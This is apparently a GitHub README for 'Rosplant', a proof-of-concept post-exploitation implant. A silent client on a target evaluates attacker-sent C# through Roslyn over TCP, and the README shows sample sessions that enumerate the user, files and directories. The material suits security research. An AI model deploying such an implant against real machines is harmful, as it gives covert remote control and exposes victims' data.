# Rosplant

Proof of concept to leverage Roslyn for post-exploitation (Roslyn + Implant = Rosplant).  It comes in two parts, the server and client.

Raw C# is entered into the server's console by the attacker, which is sent to the client (via TCP for the PoC).  The client uses Roslyn to evaluate the code and sends the results back to the attacker.

Aspects to note:

- Using statements must be included or the full namespaces used.
- Use Shift+Enter for soft newlines.
- Compilation errors are also returned.

## Example Usage
Run the server first.

```
PS C:\Rosplant\RoslynServer> dotnet run
Waiting for client...
```

Run the client app on a target, it produces no output.

```
PS C:\> .\RoslynApp.exe
```

The server will note the connection.

```
PS C:\Users\Daniel\source\repos\Rosplant\RoslynServer> dotnet run
Waiting for client... connected!
>
```

Write code.

```
> 1 + 1
2

> var x = 1;
  x++;
  x++;
  x
3

> System.Environment.UserName
Daniel

> using System;
  Environment.UserName
Daniel

> System.DateTime.UtcNow
16/09/2021 12:55:13

> System.Environment.DoesNotExist
(1,20): error CS0117: 'Environment' does not contain a definition for 'DoesNotExist'
```

The app returns the string "Done" if the C# evaluation does not produce a result.  This is mainly because my basic code for reading/writing to the network stream sucks.

```
> System.IO.File.WriteAllText("C:\\Temp\\test.txt", "This is a test");
Done

> var text = System.IO.File.ReadAllText("C:\\Temp\\test.txt");
  text
This is a test
```

More complicated code can also be used.

```
> using System.IO;
  using System.Text;

  var files = Directory.GetFiles("C:\\");
  var sb = new StringBuilder();
  foreach (var file in files)
  {
      var info = new FileInfo(file);
      sb.AppendLine(info.FullName);
  }
  var result = sb.ToString();
  result
C:\DumpStack.log
C:\DumpStack.log.tmp
C:\hiberfil.sys
C:\pagefile.sys
C:\swapfile.sys
```

I find all this interesting since it uses `CSharpScript.RunAsync()` to evalate the code.  There is no Emit or Assembly.Load.

A lot of improvements could be made such as adding common namespaces by default and loading external references or nuget packages.